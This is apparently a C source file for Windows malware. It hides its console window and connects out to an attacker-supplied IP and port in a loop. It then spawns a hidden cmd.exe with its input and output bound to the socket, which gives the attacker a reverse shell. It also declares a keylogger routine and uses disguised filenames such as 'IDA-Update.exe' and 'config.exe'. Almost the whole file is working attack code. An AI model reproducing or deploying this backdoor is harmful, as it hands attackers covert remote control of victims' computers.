#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <stdio.h>
#include <conio.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
#include <stdlib.h>

#define VK_VOLUME_MUTE 0xAD
#define VK_VOLUME_DOWN 0xAE
#define VK_VOLUME_UP 0xAF
#define LOG_DIR "%appdata%\\windows.log"
#define EXE_DIR "%appdata%\\"
#define ULTIMATE_QUESTION 42
#define TIME_LOG 1000
#define exeFile "config.exe"
#define fileName "IDA-Update.exe"
const char g_szClassName[] = "log keys window";
bool invisible = true;
//char fileName[MAX_PATH];
char fileDir[MAX_PATH];
void hide();
int Backdoor();

DWORD CALLBACK Thread_ShellSpawner(LPVOID );
DWORD WINAPI Keylogger(LPVOID);

/////////////////////////////////////////////////////////////////Winmain

int main(int argc, char* argv[])
{
    if(argc != 3){
    	printf("USAGE : name.o ip_address port\n");
    	return 0;
	}
	if (invisible) hide();
	Backdoor(argv[1], atoi(argv[2]));
}
//////////////////////////////////////////////////////////////// Hooking Windows
void hide(){
	HWND stealth;
	stealth = FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
//////////////////////////////////////////////////////////////////////StartUp
/////////////////////////////////////////////////////////////////////////////////// Launch another Program
char szSystemDir[MAX_PATH + 1];

DWORD CALLBACK Thread_ShellSpawner(LPVOID lpParam)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SOCKET sClient = (SOCKET)lpParam;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | STARTF_USEPOSITION;
    si.wShowWindow = SW_HIDE;
    si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)sClient;
    si.dwX = GetSystemMetrics(SM_CXSCREEN);
    si.dwY = GetSystemMetrics(SM_CYSCREEN);
    SetCurrentDirectory(szSystemDir);
    CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sClient);
    return 0;
}

 

int Backdoor(char* Server_Ip, int Port)
{
    WSADATA wsaData;
    struct sockaddr_in sockAddr;
    struct hostent *hp;
 	int sockAddrLen = sizeof(sockAddr);
    while(1){
	    WSAStartup(MAKEWORD(2,2), &wsaData);
	    SOCKET sClient = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	    hp = gethostbyname(Server_Ip);
	    sockAddr.sin_family = AF_INET;
	    sockAddr.sin_port = htons(Port);
	    memcpy(&sockAddr.sin_addr, hp->h_addr_list[0], hp->h_length);
	
	    GetSystemDirectory(szSystemDir, MAX_PATH);
	 	// 31.170.160.209
	
		WSAConnect(sClient, (struct sockaddr*)&sockAddr, sockAddrLen, 0, 0, 0, 0);
			//CreateThread(NULL, 0, Thread_ShellSpawner, (LPVOID)sClient, 0, NULL);
		Thread_ShellSpawner((LPVOID) sClient);
	    closesocket(sClient);
	    WSACleanup();
	}
    return 0;
}

